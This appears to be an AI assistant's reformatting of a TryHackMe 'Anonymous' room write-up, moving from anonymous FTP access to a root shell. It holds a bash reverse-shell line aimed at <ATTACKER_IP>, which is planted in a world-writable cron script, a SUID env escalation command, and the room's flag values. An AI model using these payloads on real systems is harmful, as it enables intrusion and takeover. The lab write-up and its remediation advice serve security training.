 Writeup'ınızı profesyonel GitHub formatına dönüştürüyorum. İşte geliştirilmiş versiyon:

```markdown
# 👤 Anonymous — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Linux%20|%20FTP%20|%20SMB%20|%20SUID%20PrivEsc-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026  
> **Room:** [Anonymous](https://tryhackme.com/room/anonymous)

---

## 🚩 Flags Captured

| Flag | Location | Value |
|------|----------|-------|
| **User Flag** | `/home/namelessone/user.txt` | `90d6f992585815ff991e68748c414740` |
| **Root Flag** | `/root/root.txt` | `4d930091c85047a7d0be40093f3e7c02` |

---

## 📋 Executive Summary

This writeup documents the complete compromise of the **Anonymous** machine, demonstrating a classic attack chain starting from anonymous FTP access, escalating through cronjob abuse via world-writable scripts, and culminating in privilege escalation through SUID binary exploitation. The engagement highlights critical security failures including misconfigured anonymous FTP services, insecure file permissions, and unnecessary SUID binaries.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and service enumeration |
| `smbclient` | SMB share enumeration and access |
| `ftp` | Anonymous FTP interaction |
| `nc` | Reverse shell listener |
| `find` | SUID binary enumeration |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

### Findings

| Port | State | Service | Version | Notes |
|------|-------|---------|---------|-------|
| 21/tcp | open | FTP | vsftpd 2.0.8 | Anonymous login enabled |
| 22/tcp | open | SSH | OpenSSH 7.6p1 Ubuntu | Standard access vector |
| 139/tcp | open | NetBIOS | Samba smbd 3.X-4.X | Guest access possible |
| 445/tcp | open | NetBIOS | Samba smbd 4.7.6-Ubuntu | Share enumeration possible |

**Key Observations:**
- FTP service allows unauthenticated access via `anonymous` account
- SMB shares may expose additional attack surface
- SSH available but no valid credentials identified at this stage

### SMB Enumeration

```bash
smbclient -L <TARGET_IP>
```

**Discovered Shares:**

| Share | Access | Contents |
|-------|--------|----------|
| `pics` | Read | 2 image files (dog pictures) |

**Steganography Analysis:**
Images analyzed for hidden data — no embedded payloads or steganographic content detected.

---

## 🌐 Phase 2: Initial Foothold (FTP Exploitation)

### Anonymous FTP Login

```bash
ftp <TARGET_IP>
Name: anonymous
Password: (blank or any input)
```

### Directory Enumeration

**Discovered Path:** `/scripts/`

**Contents:**

| File | Permissions | Purpose |
|------|-------------|---------|
| `clean.sh` | `-rwxr-xrwx` | Cleanup script (world-writable) |
| `removed_files.log` | `-rw-r--r--` | Execution log |
| `to_do.txt` | `-rw-r--r--` | Admin note |

**Critical Finding:** `clean.sh` is **world-writable** (`-rwxr-xrwx`) and executes periodically via cronjob.

### Admin Note (`to_do.txt`)

```
I really need to disable the anonymous login... it's really not safe
```

### Script Analysis (`clean.sh`)

```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

**Vulnerability Assessment:**
- Script executes with `namelessone` privileges via cronjob
- World-writable permissions allow arbitrary code injection
- No input validation or integrity checks

---

## 🐚 Phase 3: Reverse Shell Deployment

### Payload Crafting

Modified `clean.sh` to establish reverse shell connection:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

**Technical Analysis:**
- `bash -i` — interactive bash shell
- `>& /dev/tcp/<IP>/<PORT>` — redirects stdout and stderr to TCP socket
- `0>&1` — redirects stdin to same socket
- Creates bidirectional communication channel

### Listener Configuration

```bash
nc -lvnp 4444
```

### Payload Delivery

```bash
ftp <TARGET_IP>
cd scripts
put clean.sh
```

### Cronjob Execution

Upon next cronjob trigger:

```bash
Connection received on <ATTACKER_IP> 4444
bash: cannot set terminal process group (1052): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$
```

**Result:** Interactive shell obtained as `namelessone`

---

## 🏴 Phase 4: User Flag

```bash
ls -la /home/namelessone/
cat /home/namelessone/user.txt
```

**User Flag:** `90d6f992585815ff991e68748c414740`

---

## 🚀 Phase 5: Privilege Escalation

### SUID Binary Enumeration

```bash
find / -perm -4000 2>/dev/null
```

**Critical Finding:** `/usr/bin/env` has SUID bit set (`-rwsr-xr-x`)

### SUID Analysis

| Binary | Owner | Permissions | Risk Level |
|--------|-------|-------------|------------|
| `/usr/bin/env` | root | `-rwsr-xr-x` | 🔴 Critical |

**Why this is dangerous:**
- `env` executes with root privileges (SUID)
- Can spawn arbitrary processes while preserving elevated privileges
- Listed in GTFOBins as trivial privilege escalation vector

### GTFOBins Exploitation

```bash
/usr/bin/env /bin/sh -p
```

**Technical Breakdown:**
1. `/usr/bin/env` executes with `euid=0` (root) due to SUID
2. `/bin/sh -p` invokes privileged shell
3. `-p` flag prevents privilege dropping (preserves effective UID)
4. Result: root shell without authentication

### Privilege Verification

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 🏁 Phase 6: Root Flag

```bash
find / -name root.txt 2>/dev/null
cat /root/root.txt
```

**Root Flag:** `4d930091c85047a7d0be40093f3e7c02`

---

## 🗺️ Attack Path Visualization

```
[Attacker]
    │
    ├───nmap───► [Target: 21,22,139,445]
    │                │
    │                ▼
    │        [SMB: pics share (images)]
    │                │
    │                ▼
    │        [FTP: anonymous login]
    │                │
    │                ▼
    │        [/scripts/ directory]
    │                │
    │                ▼
    │        [clean.sh analysis]
    │                │
    │                ▼
    │        [World-writable + cronjob]
    │                │
    │                ▼
    │        [Reverse shell payload]
    │                │
    │                ▼
    │        [namelessone shell]
    │                │
    │                ▼
    │        [SUID enum: /usr/bin/env]
    │                │
    │                ▼
    │        [GTFOBins: env → root]
    │                │
    │                ▼
    └────────► [Root shell + Flags]
```

---

## 🛡️ Vulnerability Assessment & Remediation

| # | Vulnerability | Severity | CVSS | Remediation |
|---|--------------|----------|------|-------------|
| 1 | **Anonymous FTP Enabled** | 🟠 High | 7.5 | Disable anonymous access; enforce authentication; use SFTP/FTPS |
| 2 | **World-Writable Scripts** | 🔴 Critical | 9.1 | Remove write permissions for others (`chmod o-w`); implement file integrity monitoring |
| 3 | **Cronjob Abuse** | 🔴 Critical | 8.8 | Restrict cronjob execution paths; validate script integrity; use immutable files |
| 4 | **Unnecessary SUID Binaries** | 🔴 Critical | 9.0 | Remove SUID bit from `env` (`chmod u-s /usr/bin/env`); audit all SUID binaries |
| 5 | **Plaintext Admin Notes** | 🟡 Medium | 5.3 | Encrypt sensitive notes; use secure communication channels |

---

## 🎓 Key Takeaways

1. **Anonymous FTP is a liability** — Always verify write permissions in anonymous-accessible directories
2. **World-writable + cron = shell** — Classic Linux privilege escalation vector; file permissions are critical
3. **SUID enumeration is mandatory** — `find / -perm -4000` should be standard post-exploitation procedure
4. **GTFOBins accelerates exploitation** — `env` SUID = instant root; know your binaries
5. **Permission auditing reveals attack paths** — `ls -la` often exposes more than content analysis

---


---

> **⚠️ Legal Disclaimer:** This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar international legislation.

---

**Author:** Miraç Akkuş (LatenT)  
**Date:** May 2026
```
